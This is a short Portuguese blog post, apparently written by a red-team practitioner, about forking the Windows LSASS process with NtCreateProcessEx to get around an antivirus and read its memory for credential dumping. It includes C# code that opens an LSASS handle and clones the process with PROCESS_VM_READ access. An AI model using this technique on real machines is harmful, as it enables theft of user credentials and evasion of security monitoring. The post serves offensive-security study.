---
title: "LSASS: A reciclagem também está presente nos handles."
date: 2023-06-03 00:00:00 +0800
categories: [Windows]
tags: [Red Team]
---


Como sabemos, o processo do LSASS é um tesouro quando se observado pelo lado ofensivo. É neste processo que informações de logons de usuários são armazenados (como as valiosas NT hashes). Quando o assunto é dump de credenciais, um handle com permissões de `PROCESS_VM_READ` ao LSASS se torna tudo o que um atacante quer.

> `PROCESS_VM_READ¹`: permissão necessária para a leitura da memória (dump) de um processo. 
{: .prompt-info }

Contextualizando: durante meus estudos de Windows API, estive aprofundando em técnicas de dump de LSASS que normalmente um EDR/XDR não detectaria. Em um laboratório, instalei um famoso antivírus do mercado (no qual não citarei o nome) e que me rendeu bastante trabalho. Quando eu abria um handle pro LSASS e tentava interagí-lo, um erro era retornado: `STATUS_ACCESS_DENIED`.

![Desktop View](https://i.imgur.com/RBZ4JSv.png)

No código, primeiro é aberto um handle pro LSASS com o acesso `PROCESS_CREATE_PROCESS²`. Como exibido na captura de tela acima, o erro ocorria na execução da API `NtCreateProcessEx³`. Esse erro ocorre devido a privilégios insuficientes dados ao handle.

```csharp
uint accessParentProcess = PROCESS_CREATE_PROCESS;
uint accessChildProcess = PROCESS_QUERY_INFORMATION | PROCESS_VM_READ ;

IntPtr hParentProcess = OpenProcess((uint)accessParentProcess, false, Convert.ToUInt32(pid)); // abrindo um handle ao LSASS com PROCESS_CREATE_PROCESS

Console.WriteLine($"[+] Handle: {hParentProcess}");

int ningning = NtCreateProcessEx( // clonando o processo do LSASS
	out IntPtr hChildProcess,
	(uint)accessChildProcess,
	IntPtr.Zero,
	hParentProcess,
	0,
	IntPtr.Zero,
	IntPtr.Zero,
	IntPtr.Zero,
	false
);

if (ningning == 0)
{
	uint hChildPid = GetProcessId(hChildProcess);

	Console.WriteLine($"[^] Forked Handle: {hChildProcess}");
	Console.WriteLine($"[^] Forked PID: {hChildPid}");
}
```

> - `PROCESS_CREATE_PROCESS²`: permissão necessária criar uma fork (clone) de um processo alvo.
> - `NtCreateProcessEx³`: API utilizada para criar um fork do processo (LSASS).
{: .prompt-info }

![Desktop View](https://i.imgur.com/RUkXM62.png)
